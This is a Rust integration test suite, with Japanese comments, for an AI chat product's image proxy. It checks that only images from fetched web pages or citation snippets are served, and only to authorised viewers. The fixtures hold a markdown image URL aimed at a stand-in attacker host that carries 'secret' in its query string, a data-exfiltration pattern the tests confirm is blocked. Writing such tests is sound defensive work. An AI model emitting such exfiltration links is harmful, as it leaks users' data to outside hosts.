//! 回答の画像プロキシの出所判定（`ChatStore::answer_image_source`・#1044）の結合テスト。
//!
//! `STORAGE_TEST_DATABASE_URL` が設定されている時のみ実行（未設定なら early-return skip）。
//! OpenFGA はモックで置換する。確かめること:
//! - 取得した Web ページの本文に現れた画像だけを返し、取得に使うのは出典の字句。
//! - ツール結果は run の実行者本人にだけ数える（他の閲覧者は Web の引用の抜粋だけ）。
//! - 生成中（本体が空）は run のイベントから判定する。
//! - スレッドを読めない閲覧者は Forbidden。

#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::print_stderr
)]

use std::sync::{Arc, Mutex};

use async_trait::async_trait;
use authz::{
    AuthContext, AuthzClient, AuthzError, Consistency, FgaObject, ObjectType, Principal,
    ReadTupleKey, Relation, Subject,
};
use chat::{ChatError, ChatStore, ContentBlock, StreamEventKind};
use sqlx::{postgres::PgPoolOptions, PgPool};
use uuid::Uuid;

/// 既定で許可し、`deny_for` の（主体, オブジェクト）だけ拒否するモック。
struct Authz {
    deny_for: Mutex<Vec<(String, String)>>,
}

#[async_trait]
impl AuthzClient for Authz {
    async fn check(
        &self,
        s: &Subject,
        _r: Relation,
        o: &FgaObject,
        _c: Consistency,
    ) -> Result<bool, AuthzError> {
        let subject = s.to_string();
        Ok(!self
            .deny_for
            .lock()
            .unwrap()
            .iter()
            .any(|(ds, d)| *ds == subject && d == o.as_str()))
    }
    async fn write_tuple(
        &self,
        _: &Subject,
        _: Relation,
        _: &FgaObject,
    ) -> Result<bool, AuthzError> {
        Ok(true)
    }
    async fn delete_tuple(
        &self,
        _: &Subject,
        _: Relation,
        _: &FgaObject,
    ) -> Result<bool, AuthzError> {
        Ok(true)
    }
    async fn read_tuples(
        &self,
        _: &FgaObject,
        _: Option<Relation>,
    ) -> Result<Vec<ReadTupleKey>, AuthzError> {
        Ok(vec![])
    }
    async fn list_objects(
        &self,
        _: &Subject,
        _: Relation,
        _: ObjectType,
    ) -> Result<Vec<String>, AuthzError> {
        Ok(vec![])
    }
    async fn delete_object_tuples(&self, _: &FgaObject) -> Result<u32, AuthzError> {
        Ok(0)
    }
    async fn read_subject_objects(
        &self,
        _: &Subject,
        _: ObjectType,
    ) -> Result<Vec<String>, AuthzError> {
        Ok(vec![])
    }
}

async fn setup() -> Option<PgPool> {
    let Ok(db_url) = shiki_testenv::var("STORAGE_TEST_DATABASE_URL") else {
        eprintln!("STORAGE_TEST_DATABASE_URL 未設定のためスキップ");
        return None;
    };
    let pool = PgPoolOptions::new()
        .max_connections(5)
        .connect(&db_url)
        .await
        .expect("Postgres へ接続できること");
    sqlx::migrate!("../../migrations")
        .run(&pool)
        .await
        .expect("マイグレーション適用");
    Some(pool)
}

fn ctx(tenant: &str, user: &str) -> AuthContext {
    AuthContext::new(
        Principal {
            kind: authz::PrincipalKind::User,
            id: user.into(),
            email: None,
            groups: vec![],
            roles: vec![],
            tenant_id: Some(tenant.into()),
        },
        "acme".into(),
        authz::TenantId::parse(tenant).unwrap(),
    )
}

/// web_fetch の結果（封筒の内側にページ本文・後ろにモデル入力が混ざる案内）。
fn fetched(page: &str) -> String {
    format!(
        "HTTP 200 | https://news.example.com/a\n<web_page>\n{page}\n</web_page>\n（query: ![x](https://evil.example/q?d=secret)）"
    )
}

const PAGE_IMG: &str = "https://img.example.com/chart.png";
const CITE_IMG: &str = "https://img.example.com/cited.png";

struct Fixture {
    store: ChatStore,
    authz: Arc<Authz>,
    pool: PgPool,
    tenant: String,
    thread: Uuid,
    user_message: Uuid,
    answer: Uuid,
    run: Uuid,
}

async fn fixture(pool: PgPool) -> Fixture {
    let tenant = format!("t-{}", Uuid::new_v4());
    let authz = Arc::new(Authz {
        deny_for: Mutex::new(vec![]),
    });
    let store = ChatStore::connect(pool.clone(), Arc::clone(&authz) as _, None)
        .await
        .unwrap();
    let owner = ctx(&tenant, "alice");
    let thread = store
        .create_thread(&owner, "調べもの", false, None, None)
        .await
        .unwrap();
    let posted = store
        .post_message(
            &owner,
            thread.id,
            "市場規模を調べて",
            &[],
            None,
            None,
            false,
            &[],
            None,
        )
        .await
        .unwrap();
    Fixture {
        store,
        authz,
        pool,
        tenant,
        thread: thread.id,
        user_message: posted.user_message_id,
        answer: posted.assistant_message_id,
        run: posted.run_id,
    }
}

fn web_citation(snippet: &str) -> chat::Citation {
    let page = agent_core::Citation::web("https://news.example.com/a", "記事", snippet).unwrap();
    let mut c = chat::Citation::from(&page);
    c.cite_id = 1;
    c
}

#[tokio::test]
async fn finalized_answer_serves_only_page_sourced_images() {
    let Some(pool) = setup().await else { return };
    let f = fixture(pool).await;
    let content = vec![
        ContentBlock::ToolCall {
            id: "t1".into(),
            name: "web_fetch".into(),
            input: serde_json::json!({ "url": "https://news.example.com/a" }),
            step: Some(0),
        },
        ContentBlock::ToolResult {
            tool_call_id: "t1".into(),
            content: fetched(&format!("本文 ![図]({PAGE_IMG})")),
            ok: true,
        },
        ContentBlock::Citation(web_citation(&format!("抜粋 ![引用の図]({CITE_IMG})"))),
        ContentBlock::Text {
            text: format!("![図]({PAGE_IMG})"),
        },
    ];
    sqlx::query("UPDATE message SET content = $2 WHERE id = $1")
        .bind(f.answer)
        .bind(sqlx::types::Json(&content))
        .execute(&f.pool)
        .await
        .unwrap();

    let owner = ctx(&f.tenant, "alice");
    let get = |c: AuthContext, url: &'static str| {
        let store = &f.store;
        async move {
            store
                .answer_image_source(&c, f.thread, f.answer, url, None)
                .await
        }
    };

    assert_eq!(
        get(owner.clone(), PAGE_IMG).await.unwrap().as_deref(),
        Some(PAGE_IMG)
    );
    // 回答側の書き分け（%61 → a）でも、取得するのは出典の字句。
    assert_eq!(
        get(owner.clone(), "https://img.example.com/ch%61rt.png")
            .await
            .unwrap()
            .as_deref(),
        Some(PAGE_IMG)
    );
    assert_eq!(
        get(owner.clone(), CITE_IMG).await.unwrap().as_deref(),
        Some(CITE_IMG)
    );
    // 封筒の後ろ（モデル入力）と、出所に無い URL は取得しない。
    assert!(get(owner.clone(), "https://evil.example/q?d=secret")
        .await
        .unwrap()
        .is_none());
    assert!(get(owner.clone(), "https://img.example.com/other.png")
        .await
        .unwrap()
        .is_none());

    // 共有された閲覧者（run の実行者でない）はツール結果を数えない。引用の抜粋は数える。
    let bob = ctx(&f.tenant, "bob");
    assert!(get(bob.clone(), PAGE_IMG).await.unwrap().is_none());
    assert_eq!(get(bob, CITE_IMG).await.unwrap().as_deref(), Some(CITE_IMG));

    // 発話（assistant でない）は出所を持たない。
    let r = f
        .store
        .answer_image_source(&owner, f.thread, f.user_message, PAGE_IMG, None)
        .await
        .unwrap();
    assert!(r.is_none());
}

#[tokio::test]
async fn in_progress_answer_uses_run_events() {
    let Some(pool) = setup().await else { return };
    let f = fixture(pool).await;
    let claimed = f.store.claim_run(f.run, "w1", 30).await.unwrap().unwrap();
    for ev in [
        StreamEventKind::ToolCall {
            id: "t1".into(),
            name: "web_fetch".into(),
            input: serde_json::json!({ "url": "https://news.example.com/a" }),
            step: Some(0),
            via_subagent: false,
        },
        StreamEventKind::ToolResult {
            tool_call_id: "t1".into(),
            ok: true,
            content: fetched(&format!("![図]({PAGE_IMG})")),
        },
        // web_fetch 以外のツール結果は出所にしない（シェルの出力などはモデルが組み立てられる）。
        StreamEventKind::ToolCall {
            id: "t2".into(),
            name: "shell".into(),
            input: serde_json::json!({}),
            step: Some(1),
            via_subagent: false,
        },
        StreamEventKind::ToolResult {
            tool_call_id: "t2".into(),
            ok: true,
            content: fetched("![x](https://evil.example/shell.png)"),
        },
    ] {
        f.store
            .append_stream_event(f.run, claimed.fencing_token, &ev)
            .await
            .unwrap();
    }
    let owner = ctx(&f.tenant, "alice");
    let r = f
        .store
        .answer_image_source(&owner, f.thread, f.answer, PAGE_IMG, None)
        .await
        .unwrap();
    assert_eq!(r.as_deref(), Some(PAGE_IMG));
    let r = f
        .store
        .answer_image_source(
            &owner,
            f.thread,
            f.answer,
            "https://evil.example/shell.png",
            None,
        )
        .await
        .unwrap();
    assert!(r.is_none());

    let bob = ctx(&f.tenant, "bob");
    let r = f
        .store
        .answer_image_source(&bob, f.thread, f.answer, PAGE_IMG, None)
        .await
        .unwrap();
    assert!(r.is_none(), "生成中でも実行者以外にはツール結果を数えない");
}

/// サブエージェントのツール実行は確定後の本体に写らない（子のイベントは run のイベントへ直接書かれる）。
/// 確定後も、本体にサブエージェントの呼び出しがあればイベントから判定する。
#[tokio::test]
async fn finalized_answer_with_subagent_uses_child_events() {
    let Some(pool) = setup().await else { return };
    let f = fixture(pool).await;
    let claimed = f.store.claim_run(f.run, "w1", 30).await.unwrap().unwrap();
    for ev in [
        StreamEventKind::ToolCall {
            id: "c1".into(),
            name: "web_fetch".into(),
            input: serde_json::json!({ "url": "https://news.example.com/a" }),
            step: Some(0),
            via_subagent: true,
        },
        StreamEventKind::ToolResult {
            tool_call_id: "c1".into(),
            ok: true,
            content: fetched(&format!("![図]({PAGE_IMG})")),
        },
    ] {
        f.store
            .append_stream_event(f.run, claimed.fencing_token, &ev)
            .await
            .unwrap();
    }
    // 親の本体には委譲の呼び出しと結果（要約）だけが残る。
    let content = vec![
        ContentBlock::ToolCall {
            id: "s1".into(),
            name: "subagent".into(),
            input: serde_json::json!({ "task": "調べて" }),
            step: Some(0),
        },
        ContentBlock::ToolResult {
            tool_call_id: "s1".into(),
            content: "要約".into(),
            ok: true,
        },
    ];
    sqlx::query("UPDATE message SET content = $2 WHERE id = $1")
        .bind(f.answer)
        .bind(sqlx::types::Json(&content))
        .execute(&f.pool)
        .await
        .unwrap();
    sqlx::query("UPDATE generation_run SET status = 'done' WHERE run_id = $1")
        .bind(f.run)
        .execute(&f.pool)
        .await
        .unwrap();

    let owner = ctx(&f.tenant, "alice");
    let r = f
        .store
        .answer_image_source(&owner, f.thread, f.answer, PAGE_IMG, None)
        .await
        .unwrap();
    assert_eq!(r.as_deref(), Some(PAGE_IMG));
}

#[tokio::test]
async fn viewer_without_thread_access_is_forbidden() {
    let Some(pool) = setup().await else { return };
    let f = fixture(pool).await;
    let carol = ctx(&f.tenant, "carol");
    f.authz.deny_for.lock().unwrap().push((
        carol.subject().to_string(),
        carol
            .ns()
            .thread(&f.thread.to_string())
            .as_str()
            .to_string(),
    ));
    let err = f
        .store
        .answer_image_source(&carol, f.thread, f.answer, PAGE_IMG, None)
        .await
        .unwrap_err();
    assert!(matches!(err, ChatError::Forbidden), "{err:?}");
}
